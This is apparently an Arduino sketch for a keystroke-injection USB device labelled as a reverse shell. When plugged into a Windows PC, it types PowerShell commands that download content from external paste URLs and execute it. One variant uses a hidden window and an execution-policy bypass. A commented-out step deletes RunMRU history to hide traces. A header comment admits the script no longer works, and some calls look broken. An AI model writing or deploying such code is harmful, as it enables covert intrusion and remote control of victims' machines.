#include <Keyboard.h>
/*
 * 
 * 
 * 
 * 
 * 
 * THIS SCRIPT DIDN'T WORK NOW
 * 
 * 
 * 
 * 
 * 
 * 
 * 
*/
int del = 380;
int qdel = del/4;
void reverse_shell() {
  Keyboard.begin();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay(800);
  changelanguage();
  Keyboard.print("powershell");
  delay(300);
  typekey(enter);
  delay(del);
  changelanguage();
  delay(3000);
  Keyboard.print("$req ");
  delay(del);
  Keyboard.write('=');
  delay(qdel);
  Keyboard.print("[System.Net.WebRequest]::Create(");
  delay(del);
  Keyboard.write('"');
  delay(del);
  Keyboard.print("https://paste.in/raw/VUUbnn");
  delay(del);
  Keyboard.write('"');
  delay(del);
  Keyboard.print(")");
  delay(100);
  enter(100);
  Keyboard.print("$resp = $req.GetResponse()");
  delay(100);
  enter(100);
  Keyboard.print("$reqstr ");
  delay(del);
  Keyboard.write('=');
  delay(qdel);
  Keyboard.print("$resp.GetResponseStream()");
  delay(del);
  enter(10);
  Keyboard.print("$str = new-object System.IO.");
  delay(qdel);
  Keyboard.print("StreamReader ");
  delay(del); 
  Keyboard.print("$reqstr");
  delay(del);
  enter(10);
  Keyboard.print("$res ");
  Keyboard.print("= $str.ReadToEnd()");
  delay(del);
  enter(200);
  Keyboard.print(" powershell -nop -e Write-Host");
  delay(100);
  Keyboard.print("-Object $res");
  delay(del);
  enter(10);
  /*
  delay(qdel);
  Keyboard.print("Remove-ItemProperty -Path ");
  delay(del);
  Keyboard.print("'HKCU:/Software/Microsoft/Windows");
  delay(del);
  Keyboard.print("/CurrentVersion/Explorer/RunMRU'");
  delay(del);
  Keyboard.print("-Name '*' -ErrorAction SilentlyContinue");
  delay(300);
  enter(1);
  */
  Keyboard.end();
}
void reverse_shell_win10() {
  Keyboard.begin();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay(800);
  changelanguage();
  Keyboard.print("powershell -WindowStyle Hidden -Exec Bypass ");
  enter(1000);
  Keyboard.print("$u='https://paste.in/raw/ZIUG5a'");
  delay(200);
  Keyboard.print(";$r=Invoke-WebRequest -Uri ");
  delay(200);
  Keyboard.print("$u;powershell -nop -e $r.content");
  enter(200);
}
